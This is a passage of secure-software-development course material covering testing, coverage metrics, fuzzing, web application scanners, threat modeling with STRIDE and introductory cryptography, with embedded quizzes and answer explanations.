Let’s imagine a trivial program that adds two 64-bit integers. The number of possible inputs is (2^64)\*(2^64) = 2^128. If we ran tests with a 4GHZ processor, and could run and test each input in 5 cycles, it would take 13.5 x 10^21 years (13.5 zetta years) to fully test the program. Using 1 million 8-core processors does not help enough; that would reduce the time to 1.7 x 10^15 years (that is, 1.7 quadrillion years). Real programs have far more complex inputs than this, so testing even 0.00001% of all inputs of real programs is impossible in human lifetimes.

As a result, all dynamic analysis approaches must try to select a very small subset of possible inputs that still have a chance of detecting problems where they exist. They are often very effective. But dynamic analysis approaches cannot “prove” that anything works correctly in general; at best, they have a good chance of detecting problems.

#### Traditional Testing

The best-known dynamic analysis approach is traditional testing. You select specific inputs to send to a program, and check to see if the result is correct. You can test specific parts of a program, such as a method or function (this is called *unit testing*). You can also send sequences of inputs to the system integrated as a whole (*integration testing*). Most people combine unit and integration testing. Unit testing is fast and it can be easy to test many special cases, but unit testing often misses whole-system problems that integration testing is much more likely to detect. Since computers are much faster than they were decades ago, it is often best to focus on integration testing over unit testing, but both approaches have their place. The testing literature describes other kinds of testing, but for our purposes, these two approaches are enough to understand the issues.

If your software needs to work correctly, it is critically important that you have a good test suite of *automated* tests and apply that test suite in your continuous integration pipeline. By *good* we mean “relatively likely to detect serious problems in the software”. While this does not guarantee there are no errors, a good test suite greatly increases the probability of detection, and is especially important for detecting problems when you upgrade a reused component.

If you deliver software, and a defect is later found and fixed, for each fix you should think about adding another test for that situation. Often, defects that escape to the field indicate a kind of subtle mistake that might reoccur in a future version of the system. In that case, add test(s) so if that problem recurs, will be detected *before* releasing another version.

If you are contracting someone else to write (some of) your software, and you don’t want to be controlled by them later, you need to make sure that you not only get the application source code (and the rights to modify it further), but also get all the build instructions and tests necessary to be able to confidently change the software. After all, if you cannot easily build or test a software modification, there is no safe way to make modifications and ship it.

In theory, you can create manual tests, that is, write a detailed step-by-step manual procedure and have a human follow those test steps. In practice, manual tests are almost always “tests that won’t be done” because of their high costs and delay. Another problem with manual testing is that it *discourages* continuous testing, since it costs time and money to do those manual tests. So avoid manual testing in favor of automated testing where practical. In some cases you may need to do manual testing, but remember that every manual test is a test that will rarely (if ever) be done, making that test far less useful. Note that what we are describing as *manual tests* are different from *undirected manual analysis* (where humans use the software *without* a step-by-step process). Undirected manual analysis can be quite effective, but is completely different from manual tests as we have defined them here.

A tricky problem in testing is when a resource is not available. If the test requires some software, hardware, or data that you don’t have, you cannot directly test it. Typically, the best you can do in those cases is simulate it (e.g., with mocked software, simulated hardware, or a stand-in dataset). If that is the best you can do, it is usually worthwhile. But don’t confuse the simulation with reality; the test results may be misleading due to differences between the actual resource and its stand-in.

#### Traditional Testing for Security

From a security perspective, it is important to include tests for security requirements. In particular, test both “what should happen” and “what should not happen”. Often people forget to test *what should not happen* (aka negative testing). For example, where it applies, you should have a test to check “Can I read/write *without* being authorized to do so?” (the answer should be “no”) and “Can I access the system with an *invalid* certificate or no certificate at all?” (again, that should fail). It is very common for programs’ security to fail because they don’t properly check for authentication (2017 OWASP Top 10 #2) or authorization (2017 OWASP Top 10 #5), so make sure you have tests for that!

One approach to developing software is called *test-driven development* (TDD). To over-summarize, in TDD the tests for a new capability are written before the software to implement the capability. This has some advantages, in particular, it encourages writing useful tests that actually check what they are supposed to check, and it also encourages developing testable software. One potential problem with TDD is that many TDD practitioners fail to write *negative* tests. Some TDD guidance even argues that you should only write tests for the new capability and nothing else. This is terrible guidance, because sometimes some things should simply *never* be allowed to happen, and you still need to test for them. You can definitely write secure software using TDD, but you must include negative tests (tests for what the software must *not* do) if you apply TDD.

🔔 2021 OWASP Top 10 #7 is *Identification and Authentication Failures*. Inadequate authentication is such a common mistake that *Broken Authentication* is 2017 OWASP Top 10 #2, 2021 CWE Top 25 #14, and 2019 CWE Top 25 #13. It is [CWE-287](https://cwe.mitre.org/data/definitions/287.html), *Improper Authentication*. *Missing Authentication for (specifically a) Critical Function* is 2021 CWE Top 25 #11 and 2019 CWE Top 25 #36 ([CWE-306](https://cwe.mitre.org/data/definitions/306.html)). *Broken Access Control* (including authorization failures) is 2017 OWASP Top 10 #5.

#### Test Coverage

You can *always* write another test; how do you know when you have written enough tests? It takes time to create and maintain tests, and tests should only be added if they add value. This turns out to be a hard question, and much depends on how critical your software is.

Two simple measurements that can help you answer this question are *statement coverage* and *branch coverage*:

1. Statement coverage is the percent of program statements that have been run by at least one test.

2. Branch coverage is the percentage of branches that have been taken by at least one test. In an **if-then-else** construct, the **then** part is one branch and the **else** part is the other branch. In a loop, the *run the body* part is one branch and *do not run the body* is the other branch. In a switch (case) statement, each possibility is a branch.

Statement coverage and branch coverage combine dynamic analysis (test results) with static analysis (information about the code), so it is sometimes considered a *hybrid* approach. But no matter what you call it, these measurements do provide some information about how well a program is tested.

One potential problem with statement coverage and branch coverage is that some statements and branches may be unreachable for a variety of reasons. If a statement cannot be reached, you may want to insert the equivalent of “**assert(false)**” to inform tools and humans that this statement should never be reached. What you really want to know is the percent of *possible* branches and statements that were covered by tests.

As a rule of thumb, we believe that an automated test suite with less than 90% statement coverage or less than 80% branch coverage (over all automated tests) is a poor test suite. But this is merely a rule of thumb. Some experts think that larger numbers should be expected (some argue anything less than 100% of possible statements and branches is unacceptable). All other things being equal, larger numbers are good, but it is often much costlier to get those last few percent, and whether or not it is worth it depends on how important the software is. In many cases some statements or branches cannot be executed, and there may not be a way to indicate that to the measurement tools.

These test coverage measures warn you about statements and branches that are not being tested, and that information can be really valuable. From a security standpoint, coverage measures warn you about statements or branches that are not being run in tests, which suggests that either there are some important tests missing or the software is not working properly. Don’t just add a test; make sure you understand *why* something is not being covered.

For example, we earlier mentioned a dangerous vulnerability in many versions of Apple’s operating systems, formally named CVE-2014-1266 and informally called the “goto fail; goto fail;” vulnerability. The problem was that due to a duplicated **goto** statement, some code vital for checking security certificates was skipped. A statement coverage measure would have trivially detected that this security-critical code was not being run by any test, and that should have been enough warning to look into the problem.

A big problem with statement and branch coverage measures is that they can warn you about some bad automated test suites, but a bad test suite could still get 100% perfect scores. For example, a test suite might exercise all the branches and statements but not check if any of the answers were correct. That test suite would have 100% branch and statement coverage, and would also be a bad test suite. In addition, while they can tell you about whether or not existing code was tested, they cannot detect *missing* code. For example, if there is a special case that needs special handling, but nothing checks for that special case, typically these coverage measures cannot detect that.

In short: these coverage measures can be useful for warning about some problems, but they do not warn about all testing problems.

But there is more to dynamic analysis when you are interested in security. Let’s next look at fuzz testing.

#### Quiz 1.4: Dynamic Analysis Overview

\>\>Select the true statement(s) about dynamic analysis including testing:<<

[!] For high-quality software, ensure that the software is tested with all possible input values. {{ selected: That is completely impossible. We cannot even do that for software that just adds two 64-bit numbers, nevermind “real world” software. }}

[x] Unit testing often misses whole-system problems that integration testing is much more likely to detect.

[ ] Statement coverage measures the percentage of branches executed by some set of tests. {{ selected: No. Branch coverage measures branches, statement coverages measures statements. }}

[ ] Every security test should ensure that the system performs an action when it has already been authorized to do so. {{ selected: No, though this is an admittedly sneaky question. It is probably more important for security to write tests to check that the system does NOT perform various actions when it is NOT authorized to do so. These kinds of tests, to ensure that something is NOT done when it’s not supposed to be done, are sometimes called “negative testing”. It is very important, for security, that these negative tests are part of your automated test suite. }}

[x] If statements are not being exercised by your test suite, you should investigate to determine why, especially if they are important to security.

[x] In general, statement and branch coverage cannot detect missing code, they can only report the percentage of *existing* code (by some metric) that is tested.

### Fuzz Testing

Fuzz testing is a different kind of dynamic analysis.

#### Fuzzing vs. Traditional Testing

In fuzz testing, you generate a large number of *random* inputs, run the program, and see if the program behaves badly (e.g., crashes or hangs). A key aspect of fuzzing is that it does *not* generally check if the program produces the correct answer; it just checks that certain reasonable behavior (like “does not crash”) occurs.

It’s often a lot of work to create traditional tests, in part because you have to know what the correct result will be. Fuzzing gives that up, making it easier to send more inputs automatically to a program but giving up the ability to detect certain kinds of errors. As computers have gotten faster and cheaper, fuzzing has become very useful, because it is possible to run many computers for a long period of time to try out many inputs. Fuzzing can be particularly effective at detecting memory safety errors (which are both common and dangerous) and at creating odd inputs that stress the input validators. Fuzzing does not replace traditional testing, but it can be an excellent complement to traditional testing.

There are many fuzzers, and a lot of research has focused on improving them. Historically fuzzers applied truly random input. Today many fuzzers use heuristics, protocol models, and/or other information to generate the input of the software under test (SUT) aka the target of evaluation (TOE) aka the target. Some fuzzers have also increased the ways that they can detect a problem, not just by detecting a crash. These changes increase the likelihood of finding a defect (including a vulnerability).

#### Using Fuzzers Effectively

Fuzzers can be really useful for finding vulnerabilities. If you use one, it is often wise to add and enable program assertions. This turns internal state problems - which might not be detected by the fuzzer - into a crash, which a fuzzer can easily detect. If you are running a C/C++ program, you should consider running a fuzzer in combination with address sanitizer (ASAN) - ASAN will turn some memory access problems that would normally quietly occur into a crash, and again, this transformation improves the fuzzer’s ability to detect problems.

Both the Firefox and Chromium web browsers use fuzzers, combined with ASAN, to try to detect vulnerabilities before releasing new versions.

If your program performs checks on input like examining checksums or CRC (Cyclic Redundancy Check) headers, you will probably soon need to disable those checks or specially re-implement those values when using a fuzzer. By all means use the fuzzer on the program unmodified first, but the problem is that the fuzzer will end up primarily testing the checksum/CRC header checking code again and again, not the rest of the code. Some fuzzers are tailored to create well-formatted inputs that will pass checks such as CRC and then attempt to find errors deeper in the program under test.

Many fuzzers are *mutation-based* - that is, they begin with a starting set of sample inputs (called “seeds”), and then repeatedly mutate previous inputs to create new test inputs. The effectiveness of mutation-based fuzzers greatly depends on the seeds chosen. A useful rule-of-thumb for creating seeds is to try to select a minimum set of inputs necessary to cover (or almost cover) the code (that is, to achieve 100% statement coverage). To learn more, see [*Optimizing Seed Selection for Fuzzing*](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf), 2014. If that is too many seeds, select seeds to cover as much of the code as possible with that number of seeds (so each seed will be significantly different).

#### Coverage-Guided Fuzzers

An important subclass of fuzzer is a *coverage-guided fuzzer*. These fuzzers instrument the software under test (SUT, the program being tested) so that the fuzzer gets information about what code is covered when each input is executed (including, in many cases, how often various parts of the code are executed). This information is then used to determine the next inputs to be generated. The tool American Fuzzy Lop (AFL) demonstrated the power of this technique; it uses not just which parts of the code are executed, but how many times, and prefers to generate new inputs similar to previous inputs that caused novel counts. Other tools such as libFuzzer also use this approach. These fuzzers are also called *feedback-based fuzzers* or a *feedback-based application security testing* (FAST) tool ([*What is FAST?*](https://blog.code-intelligence.com/what-is-fast), by Sergej Dechand, 2020). This approach combines static and dynamic analysis, so these tools could be considered hybrid analysis tools.

#### Diminishing Rate of Return

A challenge with fuzzers is that over time they generally have a diminishing rate of return. That is, they are often successful in finding vulnerabilities in programs that have never been fuzzed before, but it can quickly take exponential time (or never) to find the next vulnerability once the previously-detected problems have been fixed. It can also require resources; fuzzing may take days, weeks, or even longer of continuous execution on a number of parallel systems before fuzzing can find something. That does not mean fuzzers are useless - they can be very useful - but again, they are only part of a tool suite to make software secure.

#### Fuzzing Projects

If you manage an OSS project, you might consider participating in [Google’s OSS-Fuzz project](https://github.com/google/oss-fuzz). OSS-Fuzz applies fuzzing in combination with various sanitizers to try to detect vulnerabilities. [The Fuzzing Project](https://fuzzing-project.org/) encourages/coordinates applying fuzz testing to OSS.

#### Fuzzing and Web Application Scanners

There are a huge number of fuzzers, and things are changing all the time. The first step is to know that there is a tool that might be useful. However, if what you have developed is a web application, there is a tool specifically designed for that situation that typically embeds a fuzzer within it, called a *web application scanner*. We will discuss that in the next unit.

#### Quiz 1.5: Fuzz Testing

\>\>Select the true statement(s) about fuzzing:<<

[!] Fuzzers send input to a program and determine if the output is correct.

[x] A coverage-guided or feedback-based fuzzer uses information about what code is covered by past input executions to determine what inputs to generate next.

[x] When fuzzing a component written in C or C++, it can be helpful to enable sanitizers such as address sanitizer (ASAN) to turn internal state problems into a crash that the fuzzer can detect.

[x] Fuzzing typically requires extra steps to apply to code that processes inputs with a checksum validation.

[ ] Typically, fuzzing finds new vulnerabilities as a steady state over time. {{ selected: No, typically there is a diminishing rate of return. }}

### Web Application Scanners

[Web application]

Today many people develop web applications, and web applications have many standard interfaces. As a result, there are programs designed specifically to dynamically analyze web applications to look for vulnerabilities.

A web application scanner (WAS), also called a web application vulnerability scanner, essentially pretends it is a simulated user or web browser and tries to do many things to detect problems. Think of a WAS as a frenetic and malicious web browser user; the WAS will try to click on every button it finds, enter bizarre text into every text field it finds, and so on. In short, it attempts simulated attacks and odd behavior to try to detect problems. This means that WASs often build on fuzzers internally, but they are specifically designed to analyze web applications.

A key issue in a WAS is what input vectors it can test. Some WASs can only create new URLs and cannot test client-side JavaScript applications. Such programs are not as useful for testing programs with client-side JavaScript.

WASs also differ in how they detect problems with the results. Unsurprisingly, crashing a web application would be reported as a problem. WASs also tend to have a variety of *passive* checks (e.g., to check the attributes of cookies returned) to attempt to detect a variety of problems.

Like many other tools, WASs operate heuristically and generally have a variety of rules. As a result, different WASs may detect (and not detect) different things.

You will want to use a WAS in a test environment, not a true production environment, since it will *intentionally* attempt to cause problems. You may want to start with just running the WAS as-is, but you will soon want to create a bogus account and give the WAS the bogus account information. Otherwise, if your login system is built correctly, the WAS will only be able to test for vulnerabilities for someone without valid login credentials.

There are many of these tools. OSS tools include OWASP ZAP, W3AF, IronWASP, Skipfish, and Wapiti. Proprietary tools include IBM AppScan, HP WebInspect, and Burp Suite Pro. If you have no idea, you might check out OWASP ZAP at least; it is easy to use, and it can find many things. But tools change over time, and it is best to look at your options before picking one (or several).

If you are developing a web application, then it is a good idea to use at least one web application scanner. These tools will not find all possible problems, and like fuzzers, they tend to find fewer problems over time. But they can still be useful.

The term Dynamic Application Security Testing, or DAST, is often seen in literature. However, the *meaning* of DAST has a lot of variation:

* For some, DAST is dynamic analysis for finding vulnerabilities in web applications (see VeraCode, [*DAST TEST: Benefits of a DAST test for application security*](https://www.veracode.com/security/dast-test), 2020), making the term mostly equivalent to *web application scanners*. John Breeden II ([*9 top fuzzing tools: Finding the weirdest application errors*](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html), 2019) states this and expressly differentiates DAST from fuzzing.

* Thomas Scanlon ([*10 Types of Application Security Testing Tools: When and How to Use Them*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html), 2018) defines DAST as tools for finding security vulnerabilities where *“the tester has no prior knowledge of the system”* and that *“DAST tools employ fuzzing”*. With this definition, web application scanners and fuzzers are DAST tools. Similarly, Sergej Dechand ([*What is FAST?*](https://blog.code-intelligence.com/what-is-fast), 2020) includes web application scanners and fuzzers under “DAST”.

In this course we have intentionally used more specific terms instead of DAST, in the hopes of making things clearer. The point, regardless of the terminology, is to use approaches (including tools) to find and fix vulnerabilities before the attackers exploit them.

#### Quiz 1.6: Web Application Scanners

\>\>A web application scanner (WAS) executes at runtime; it repeatedly sends data to a web application in an attempt to trigger and then detect problems. True or False?<<

(x) True

( ) False

## Other Verification Topics

### Combining Verification Approaches

There are many other kinds of verification approaches, and many ways to combine them.

A *penetration test* (aka *pen test*) simulates an attack on a system to try to break into (*penetrate*) the system. The people doing a penetration test are called penetration testers or a red team; they may be actively countered by a defensive team (also called a blue team). The point of a penetration test is to learn about weaknesses so they can be strengthened *before* a real attacker tries to attack the system.

A *security audit* reviews a system to look for vulnerabilities. Often the phrase is used implying a more methodical approach, where designs and code are reviewed to look for problems. But that is not always true; the terms *security audit* and *penetration test* are sometimes used synonymously. Regardless of this, security audits and penetration tests often employ a variety of techniques, including both static and dynamic analysis, to try to find vulnerabilities before real attackers can find and exploit them.

The Open Source Security Foundation (OpenSSF) Best Practices badge identifies a set of best practices for open source software (OSS) projects. There are three badge levels: passing, silver, and gold. Each level requires meeting the previous level; gold is especially difficult and *requires* multiple developers. Within each level are a set of criteria that are considered best practices for developing secure and sustainable OSS, and each criterion has a short identifier. Here are some examples of its criteria:

* “*The project MUST **use at least one automated test suite that is publicly released as FLOSS** (this test suite may be maintained as a separate FLOSS project).”* [test] Note that this criterion is solely about a traditional automated test suite (e.g., for its functionality).

* *“At least one static code analysis tool MUST be applied to any proposed major production release of the software before its release, if there is at least one FLOSS tool that implements this criterion in the selected language.”* [static_analysis]

* *“The project sites (website, repository, and download URLs) MUST support HTTPS using TLS.”* [sites_https]

If you are using OSS, consider preferring OSS who have earned a badge. If you are developing OSS, you should strongly consider working to earn an Open Source Security Foundation (OpenSSF) Best Practices badge. By implementing these best practices you will increase the likelihood of developing higher-quality and more secure software. To learn more and get started, check out the [OpenSSF Best Practices Badge Program](https://bestpractices.coreinfrastructure.org/en).

#### Quiz 1.7: Combining Verification Approaches

\>\>Select the true statement(s):<<

[!x] A pen test simulates an attack on a system, attempting to break into it.

[x] A security audit looks for vulnerabilities by reviewing information about the system, and often implies a methodical approach.

[x] The OpenSSF Best Practices badge is a set of criteria for open source software projects.

[ ] None of the above

# Threat Modeling

This chapter describes the basics of threat modeling along with a specific threat modeling approach called STRIDE.

Learning objectives:

1. Discuss the basics of threat modeling.

2. Explain what STRIDE is and its basic application.

## Threat Modeling/Attack Modeling

### Introduction to Threat Modeling

A useful trick for creating secure systems is to *think like an attacker* before you write the code or change to the code.

Threat modeling is the process of examining your requirements and design to consider how an attacker might exploit or break into your system, so that you can try to prevent those problems in the first place. For our purposes, we will consider the term *attack modeling* as a synonym with *threat modeling*, though some do use the terms to mean different things. Industry terminology differs a lot here, and we want to focus on what is useful to do, not what to call it. A great thing about threat modeling/attack modeling is that you can do this *before* a design is decided on or code is written, so they can help you very early when developing a new system.

If there is no meaningful security risk, threat modeling is probably unwarranted. Threat modeling is also probably not worth it if you are just writing a small component inside a system that is not focused on security (such as a single-function JavaScript package for doing simple text manipulation). Threat modeling generally focuses on larger systems where there are clear trust boundaries. But if there is a meaningful security risk, and you are building something larger, carefully thinking about things from the attacker’s point of view can be very useful.

There are many different ways to do threat modeling. For example, where do you start? Different approaches might emphasize starting with:

1. The attacker (what are the attacker’s goals? capabilities? way of doing things?)

2. The assets to be protected

3. The system design.

You should think at least a little about all of them, but it helps to have a place to start. Many security experts will start with the attacker or the assets. However, for many developers, it is often easiest to start with the design. Many developers don’t know how attackers operate in depth, and many organizations have a surprising amount of trouble figuring out what assets are most important. In contrast, if you develop software at all, then you *have* to be able to divide up a problem, so for most developers focusing on design starts with a natural strength. You should not *ignore* who the attacker is, or what assets need protecting; it is just a matter of emphasis.

A related problem is how to do this kind of analysis. Some people create a set of *attack trees*. Each tree identifies an event an attacker tries to cause, working backwards to show how the event could happen (hopefully, you will show that it cannot happen or is exceedingly unlikely). This approach can work well, but in practice, it requires expertise in attack methods; that is an expertise few developers have. Some approaches focus on analyzing an organization, but if your software will be used in many different organizations, then this does not work well.

For our purposes, we will focus in the next unit on a very simple approach called STRIDE.

#### Quiz 2.1: Introduction to Threat Modeling

\>\>Select the true statement(s):<<

[!x] For purposes of this course, threat modeling / attack modeling is the process of examining your requirements and design to consider how an attacker might exploit or break into your system, so that you can try to prevent those problems in the first place.

[x] Many developers may find it easier to focus on system design instead of attacker approaches or the assets that most need protecting.

[ ] You should always do threat modeling / attack modeling {{ selected: This probably is not worth it for small components and/or components that have no significant security concerns. You are welcome to do it, but you may find your efforts better spent elsewhere. }}

### STRIDE

An easy design-centric approach is one developed by Microsoft called STRIDE. We will cover STRIDE here, because it is better to know one simple approach that helps than a complex system that may be too hard to use. In the literature this version is called *STRIDE-by-element*. See Robert Reichel’s [*How we threat model*](https://github.blog/2020-09-02-how-we-threat-model/) (2020) for a discussion of how GitHub uses STRIDE.

Microsoft recommends doing the following steps for any threat modeling (attack modeling) approach ([Microsoft Threat Modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)):

1. Define security requirements.

2. Create an application diagram.

3. Identify threats.

4. Mitigate threats.

5. Validate that threats have been mitigated.

When applying STRIDE in step 2, you need to create a simple representation of your design. Typically, this is done by creating a simple data flow diagram (DFD) (for more details, see [*Threat Modeling: 12 Available Methods*](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), by Nataliya Shevchenko, 2018):

1. Data processes are represented with circles

2. Data stores are represented with lines above and below their names (you may also see them as cylinders)

3. Data flows are represented with directed lines; these include data flows over a network

4. Interactors (items that are outside your system and interact with it) typically have simple icons, such as a stick figure for a human

5. Trust boundaries are represented with a dashed line; these represent the border between trusted and untrusted portions.

Elements are everything except the trust boundaries. That is, processes, data stores, data flows, and interactors are all elements.

The idea is to have a simple model of the design that shows the essential features. Here are some quick rules of thumb for a good representation:

* Every data store should have at least one input and at least one output (“no data coming out of thin air”).

* Only processes read or write data in data stores (“no psychokinesis”)

* Similar elements in a single trust boundary can be collapsed into one element (“make the model simple”).

Then, when applying STRIDE in step 3, you examine each of the elements (processes, data stores, data flows, and interactors) to determine what threats it is susceptible to. For each element, you look for the threats as shown in this table:

![image alt text](stride_threat_categories.png)

**STRIDE Threat Categories**, retrieved from [SEI](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), originally from Microsoft

Notice that “STRIDE” is simply an acronym for the threats being considered: Spoofing, Tampering, Repudiation, Information disclosure, Denial of Service, and Elevation of privilege.

STRIDE is one of the oldest, most well-known, and simplest forms of threat modeling ([*Threat Modeling: Uncover Security Design Flaws Using the STRIDE Approach*](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx), by Shawn Hernan, Scott Lambert, Tomasz Ostwald, and Adam Shostack, 2006). There are tools you can use that are designed to support STRIDE; you can also use STRIDE with basic tools such as a drawing tool, word processor, and/or spreadsheet.

As we noted earlier, there are other approaches. Feel free to learn or use them instead if they help you. The Software Engineering Institute (SEI) has even written some analyses of the various approaches, including their pros and cons ([Shevchenko, 2018](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html)). Microsoft has also written some material on [threat modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling).

Threat modeling may be overkill if you do not have significant security threats, and threat modeling does not guarantee you will find all the problems. That said, if you have significant security threats, threat modeling using approaches like STRIDE can provide a relatively simple way to think through key questions before you invest a lot of time.

🔔 Failing to apply threat modeling is considered part of 2021 OWASP Top 10 #4, insecure design.

#### Quiz 2.2: STRIDE

\>\>Select the true statement(s):<<

[!x] STRIDE uses a simplified representation of the design, typically a data flow diagram.

[x] For STRIDE, similar elements in the design are usually collapsed into one element as long as they don’t cross a trust boundary.

[ ] The point of STRIDE is to examine each design element to see if there as a threat of information disclosure or tampering with data. {{ selected: No, that is only part of the story. Yes, you should consider information disclosure (violating confidentiality) and tampering with data (violating integrity). But those are just the “I” and “T” of STRIDE. You should also consider spoofing of identity, repudiation, denial of service, and elevation of privilege. }}

# Cryptography

This chapter describes the basics of how to use cryptography to help develop secure software, including the basics of symmetric/shared key encryption algorithms, cryptographic hashes, public-key (asymmetric) encryption, how to securely store passwords, cryptographically secure pseudo-random number generators (CSPRNG), and Transport Layer Security (TLS).

Learning objectives:

1. Understand what cryptography is.

2. Discuss the basics of symmetric/shared key encryption algorithms.

3. Discuss the basics of cryptographic hashes.

4. Discuss the basics of public-key (asymmetric) encryption.

5. Explain how to *securely* store passwords.

6. Discuss the basics of cryptographic pseudo-random number generators (PRNG).

7. Understand the basics of using Transport Layer Security (TLS).

8. Understand the basics of other key cryptographic topics.

## Applying Cryptography

### Introduction to Cryptography

The word *cryptography* comes from the Greek phrase for “secret writing”. Cryptography is the science or art of transforming intelligible form, and its reverse. However, many people attack cryptographic systems; cryptanalysis is the science or art of undoing a cryptographic transformation without the exact knowledge of how it was done.

Cryptography provides a set of tools that can sometimes help develop secure software. Cryptography *cannot* solve all security problems. In fact, most computer security vulnerabilities have nothing to do with cryptography.

![image alt text](xkcd_security.png)

**Security**, retrieved from [xkcd](https://xkcd.com/538/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

That said, in *some* systems cryptography is a vitally important part of making a system secure. Cryptography is often used to protect sensitive data’s confidentiality, and it can do that in two ways: *at rest* (storing the information in an encrypted form) and *in transit* (transmitting the information in an encrypted form). Cryptography can also, with certain limits, verify that information is from someone with a corresponding key, and/or verify that certain data has not been changed.

Failing to use cryptography when it should be used is, by itself, a security vulnerability. Information that is not encrypted is often called “cleartext” or “plaintext”.  In many networks (including the Internet and its subset the world wide web), as well as many storage systems (such as backups), plaintext can be intercepted and modified by unauthorized parties.

For example, we typically want our web browsers and web servers to have an encrypted connection between each other so that the information is confidential from others, cannot be modified without detection, and so that at least the web browser can have high confidence that it is communicating with the correct web server. Many systems manage sensitive data such as financial data, healthcare data, and personally-identifiable information (PII). Cryptography is often an important part of protecting this data so it cannot be easily read or undetectably modified by others.

However, there are many people who know how to attack cryptographic systems. Using cryptography incorrectly can sometimes lead to having false confidence in an insecure system. What’s worse, incorrectly-used cryptography can sometimes be hard to spot if you are not an expert, so these mistakes may be exploited for long periods of time.

Some countries have various laws and regulations on cryptography, and they have changed over the years. Let's look at the US as an example. The export of cryptographic technology and devices from the United States was severely restricted until 1992. More recently the US has required email notifications for many uses of encryption technology. In 2021 the US rule was further relaxed, so that open source software projects only need to provide a notification if they use "non-standard cryptography". Generally you should use standard well-vetted cryptographic algorithms and protocols anyway, so for many open source software projects this eliminates the notification requirement when exporting from the US. See the [Linux Foundation's *Understanding Open Source Technology & US Export Controls*](https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/) for more information. A discussion of cryptographic regulations around the world is beyond the scope of this course.

🔔 Cryptographic failures are 2021 OWASP Top 10 #2. It was 2017 OWASP Top 10 #3 and then named Sensitive Data Exposure. Sensitive data exposure is not always caused by poor use of cryptography, but it is a common underlying cause. 2021 CWE Top 25 #35 is Cleartext Transmission of Sensitive Information ([CWE-319](https://cwe.mitre.org/data/definitions/319.html)). *Inadequate encryption strength* is such a common cause of security vulnerabilities by itself that it is 2019 CWE Top 25 #3 (it is [CWE-326](https://cwe.mitre.org/data/definitions/326.html)).

For normal software development there are three key rules for cryptography:

1. **_Never_ develop your own cryptographic algorithm or protocol**.<br>Creating these is highly specialized. To do a good job you need a PhD in cryptography, which in turn requires advanced college mathematics. Instead, find out what has been publicly vetted by reputable cryptographers and use that.

2. **_Never_ implement your cryptographic algorithms or protocols (if you have an alternative)**.<br>There are a large number of specialized rules for implementing cryptographic algorithms that don’t apply to normal software and are thus not known to most software developers. Tiny implementation errors of cryptographic algorithms often become massive vulnerabilities. Instead, reuse good implementations where practical.

3. **Cryptographic systems (such as algorithms and protocols) are occasionally broken.**<br>Make sure the ones you choose are still strong enough, and make sure you are  prepared to replace them.

When choosing a cryptographic library, prefer ones that have had significant public review and have a simple-to-use-correctly API. Otherwise, you risk having a vulnerability either in the reused component or having one caused due to incorrect use of an API.

Cryptanalysts are always looking for ways to break cryptographic algorithms, and cryptographers are always working to counter those attacks. Historically, cryptographic algorithms are developed, last for a while, and then finally are broken due to some attack. So before choosing anything in cryptography, do some searches to make sure that what you are choosing is not weak or broken. Perhaps nothing has been broken recently… but it would be unwise to assume that.

The following sections will identify some key algorithms and protocols, and some pointers about them.

### Symmetric/Shared Key Encryption Algorithms

A *symmetric key* or *shared key* encryption algorithm takes data (called “cleartext”) and a key as input, and produces encrypted data (called “ciphertext”). It can also go the other way: using the ciphertext and the same key, it can produce the corresponding cleartext.

What is important about symmetric key encryption algorithms is that the *same* key is used to both encrypt and decrypt the data. So if you want people to be able to decrypt some ciphertext encrypted this way, you have to arrange for them to get the key. Most modern symmetric key algorithms are extremely fast (they are often hardware-accelerated), and they form the basis of many cryptographic systems.

#### Choosing a Symmetric Key Algorithm

At the time of this writing (2020), the most common symmetric key algorithm is the Advanced Encryption Standard (AES). AES supports 3 key sizes: 128, 192, or 256 bits; the longer key sizes are stronger against attack, but take longer to execute. At the time of this writing, even 128 bits is considered adequately secure for most purposes, but check to see if something has changed. AES is extremely fast; it was designed to be fast on modern processors, and many processors have mechanisms that speed it up even further.

There are other historical symmetric key algorithms that are considered *insecure* for typical use cases today:

* DES: Its 56-bit key length is far too short to be secure today.

* RC4: Many vulnerabilities have been found in RC4, and it is generally considered insecure.

* 3DES: Internally, this has a block size of only 64 bits. Algorithms with such small block sizes are vulnerable to an attack called a *birthday attack* if they are used to encrypt significant amounts of data with the same key.

* Blowfish: This also has a block size of only 64 bits, and thus has the same problems as 3DES.

There are alternative symmetric key algorithms that are also generally considered secure. For example, TwoFish was a finalist in the contest that led to AES, and at the time of this writing has no known practical vulnerabilities.

#### Choosing a Mode

Many symmetric key algorithms, including AES, are what is called *block algorithms*. With block algorithms you must also choose a *mode* to use. Here is the most important rule about modes:

**Never use Electronic Code Book (ECB) mode!**

The ECB mode is basically a debug or test mode for testing cryptographic algorithms. In ECB mode, the same block of data will produce the same encryption result. This is disastrous for an encryption algorithm, because it reveals far too much about the data that is supposed to be encrypted. A great illustration of this is the so-called “ECB Penguin” image; this image is encrypted using an ECB mode. Encrypted images should appear as random noise, but because ECB mode is used, in the ECB Penguin the image of Tux the Penguin is clearly visible.

![The ECB Penguin: A dark encrypted image that clearly shows the Linux mascot, Tux the Penguin](ecb_penguin.png)

The ECB Penguin, by Filippo Valsorda, retrieved from [filippo.io](https://blog.filippo.io/the-ecb-penguin/). Licensed under [CC BY-SA 4.0 International](https://creativecommons.org/licenses/by/4.0/legalcode). This image was inspired by the original lower-resolution ECB Penguin image by Wikipedia User: Lunkwill. Source “The ECB Penguin” (2013-11-10). Based on the Tux the penguin official Linux mascot created by Larry Ewing in 1996

